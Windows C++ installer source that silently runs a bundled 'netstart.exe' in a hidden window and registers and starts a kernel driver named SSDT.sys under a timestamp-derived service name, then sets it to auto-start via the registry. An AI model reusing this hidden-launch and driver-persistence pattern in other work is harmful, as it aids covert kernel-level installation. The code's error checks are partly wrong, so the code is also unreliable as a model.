// Install.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include <stdio.h>
#include <time.h>

#define SERVICE_NAME_FILE	 "\\Data\\service_name.txt"
#define DRIVER_NAME			  "\\sys\\SSDT.sys"
#define SERVICE_BASE_NAME		"SSDT"

char SSDT_SERVICE_NAME[MAX_PATH] = {0};

bool InstallNet();
bool InstallSSDT();
bool StartDriver(SC_HANDLE sc_hManager,SC_HANDLE sc_hResult);
int SetServiceName();
bool SetAutoRun();



int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
 	// TODO: Place code here.
	if(SetServiceName()==-1)
		return -1;
	int flag=1;
	bool ssdt,net;
	
	net = InstallNet();
	ssdt = InstallSSDT();
	if(ssdt==false)
	{
		flag = -1;
	}
	if(ssdt==false)
	{
		flag = -2;
	}
	return flag;

}

bool InstallNet()
{
	char path[MAX_PATH];
	STARTUPINFO si = { sizeof(si) }; 
    PROCESS_INFORMATION pi;   
 
    si.dwFlags = STARTF_USESHOWWINDOW;   
    si.wShowWindow = SW_HIDE;
	GetCurrentDirectory(MAX_PATH,path);
	strcat(path,"//sys//netstart.exe");

    bool bsucess = CreateProcess(NULL, 
        path,
        NULL,
        NULL,
        FALSE,
        0,
        NULL,
        NULL,
        &si,
        &pi);
 
    if(bsucess)
    {
        HANDLE m_hProcess=pi.hProcess;  
        CloseHandle(pi.hThread);

        WaitForSingleObject(m_hProcess,INFINITE);
 
        DWORD dwexitcode;
        GetExitCodeProcess(m_hProcess, &dwexitcode);
		
		if(dwexitcode==1)
			return true;
		else
			return false;
    }
    else
    {
        return false;
    }
}

bool InstallSSDT()
{
	SC_HANDLE sc_hManager = NULL;
	SC_HANDLE sc_hResult = NULL;
	sc_hManager = OpenSCManager (NULL,NULL,SC_MANAGER_ALL_ACCESS);
	if(NULL == sc_hManager)
	{
		return false;
	}
	char strPath[MAX_PATH];
	GetCurrentDirectory(MAX_PATH,strPath);
	strcat(strPath,DRIVER_NAME);

	sc_hResult = CreateService(sc_hManager,
		SSDT_SERVICE_NAME,
		SSDT_SERVICE_NAME,
		SERVICE_ALL_ACCESS,
		SERVICE_KERNEL_DRIVER,
		SERVICE_DEMAND_START,
		SERVICE_ERROR_IGNORE,
		strPath,
		NULL,
		NULL,
		NULL,
		NULL,
		NULL);
	int i = GetLastError();
	if(NULL == sc_hResult )
	{

		if(i == ERROR_SERVICE_EXISTS)
		{
			return false;
		}
		CloseServiceHandle(sc_hManager);
		return false;
	}else
	{
		return StartDriver(sc_hManager,sc_hResult);
	}
}
bool StartDriver(SC_HANDLE sc_hManager,SC_HANDLE sc_hResult)
{
	if(StartService(sc_hResult,NULL,NULL))
	{
		CloseServiceHandle(sc_hResult);
		CloseServiceHandle(sc_hManager);
		if(!SetAutoRun())
		{
			return false;	
		}
		return true;
	}
	else
	{
		CloseServiceHandle(sc_hResult);
		CloseServiceHandle(sc_hManager);
		return false;
	}
}

int SetServiceName()
{
    DWORD dwRead = 0;
    DWORD dwWrite = 0;
	char path[MAX_PATH];
	int num;
	char buf[30]={0};
	GetCurrentDirectory(MAX_PATH,path);
	strcat(path,SERVICE_NAME_FILE);

	HANDLE hFile = CreateFile(path, GENERIC_WRITE | GENERIC_READ, 0, 
	 NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		return -1;
	}
	time_t t;
	t = time(NULL);
	sprintf(buf,"%lld",t);
	strcpy(SSDT_SERVICE_NAME,SERVICE_BASE_NAME);
	strcat(SSDT_SERVICE_NAME,buf);

    WriteFile(hFile, SSDT_SERVICE_NAME, sizeof(SSDT_SERVICE_NAME), &dwWrite, NULL);
 
	CloseHandle(hFile);
 
    return 0;
}
bool SetAutoRun()
{
	DWORD Desc=0x02;
	HKEY hKey;
	int length = 0;

	char KeyVal[MAX_PATH] = "SYSTEM\\CurrentControlSet\\services\\";
	strcat(KeyVal,SSDT_SERVICE_NAME);

	if(ERROR_SUCCESS !=RegOpenKey(HKEY_LOCAL_MACHINE,KeyVal,&hKey))
	{
		RegCloseKey(hKey);
		return false;
	}
	if(ERROR_SUCCESS !=RegSetValueEx(hKey, "Start", 0, REG_DWORD, (const BYTE *)&Desc,sizeof(DWORD)))
    {
        RegCloseKey(hKey);
        return false;
    }
    RegCloseKey(hKey);
	return true;
}